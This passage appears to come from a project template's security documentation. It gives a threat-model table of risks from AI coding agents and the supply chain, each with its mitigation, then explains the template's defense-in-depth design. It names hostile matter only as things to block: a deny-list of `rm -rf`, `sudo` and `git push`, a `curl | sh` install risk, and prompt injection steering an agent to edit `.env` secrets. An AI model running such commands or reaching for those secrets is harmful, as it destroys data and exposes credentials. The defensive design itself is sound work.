| Hallucinated dangerous code (`subprocess shell=True`, `pickle`)     | Ruff `S` (bandit) rules + `30-security.mdc` always-applied rule                                                                                                    |
| Non-deterministic dependency versions                               | `uv.lock` committed + `uv lock --check` + `uv sync --frozen` in CI                                                                                                 |
| Supply-chain attack on a dependency                                 | Dependabot grouped PRs (review window) + `uv.lock` (no auto-resolve) + **`pip-audit` in CI** against the locked runtime set                                        |
| Supply-chain attack on a GitHub Action                              | SHA-pinned actions + Dependabot `github-actions` ecosystem + `actionlint` job                                                                                      |
| Supply-chain attack via `curl ǀ sh` install of `uv` in Dockerfile   | `.devcontainer/Dockerfile` uses `COPY --from=ghcr.io/astral-sh/uv:<pinned>` instead of executing a downloaded script                                                |
| Drift between `uv` versions across machines                         | `[tool.uv] required-version` pin in `pyproject.toml` (matches the OCI image tag in the Dockerfile)                                                                 |
| Excessive `GITHUB_TOKEN` permissions                                | `permissions: contents: read` at workflow level **and** repeated per job                                                                                           |
| Untrusted code running with write token (`pull_request_target`)     | Workflow uses `on: pull_request` only; the walkthrough flags `pull_request_target` as out-of-scope                                                                 |
| Agent running destructive commands on host                          | Codex `sandbox_mode = "workspace-write"` + Claude deny-list (`rm -rf`, `sudo`, `git push`) + devcontainer (host isolation)                                         |
| Prompt-injection tricking the agent into editing `.env`             | Claude deny-list on `Edit/Write/Read(.env*)` + Cursor `guard-env.py` hook + always-applied security rule                                                           |
| Agent installing random packages                                    | Claude deny-list on `pip`, `pipx`, `poetry`, `conda`, `npm`, `pnpm`, `yarn`; AGENTS.md mandates `uv add` only                                                       |
| Stale env hiding bugs                                               | Matrix on Python 3.12 + 3.13; `filterwarnings = ["error"]` makes deprecations fail tests                                                                           |
| Inconsistent behaviour across coding agents                         | Single `AGENTS.md` source of truth; `CLAUDE.md` imports it; Cursor MDC rules reference it                                                                          |
| Security-critical config changed without review                     | `.github/CODEOWNERS` requires review on `.cursor/`, `.codex/`, `.claude/`, `.github/workflows/`, `AGENTS.md`, `SECURITY.md`                                         |
| Agent introduces a regression in best-practice signals              | `.github/workflows/scorecard.yml` (OpenSSF Scorecard) annotates the PR via Code Scanning when a change degrades any of the ~18 tracked signals                     |
| Workflow / image pins rot over time                                 | Dependabot ecosystems: `github-actions`, `uv`, **`docker` (devcontainer)**; pinning is paired with weekly bump PRs so freshness and immutability coexist           |
| Boilerplate inflation eating the context window                     | "Rules over code": minimal `src/` + extensive `AGENTS.md` rather than scaffolded base classes                                                                      |

The design principle behind all of this is **defense in depth with
mostly-passive enforcement**:

- *Defense in depth*: every secret-leak risk has at least two
  independent layers (gitignore + gitleaks pre-commit + gitleaks in CI
  + cursorignore + sandbox network block + fixture-scrubbed test keys
  + `guard-env.py` hook), so a single misconfiguration does not open
  the door.
- *Mostly-passive enforcement*: the heavy lifting is done by files the
  agent already chooses to read (rules, ignores) or policies the
  agent's own runtime already enforces (sandbox modes, allow-lists).
  The two `.cursor/hooks/` scripts are the only *active* enforcement
  layer, and they only intercept agent actions (`beforeShellExecution`,
  `beforeSubmitPrompt`) — not your editor's keystrokes, saves, or
  formatters. They degrade gracefully in non-Cursor editors (they
  simply don't fire) and the rest of the template carries the load.

If you ever want a quicker mental model: the template makes the *safe*
path the *easy* path. `uv run pytest` works; `pip install requests` is
denied. Reading `.env.example` works; reading `.env` is invisible.
Running ruff and mypy is a single command; the alternative is failing
CI.
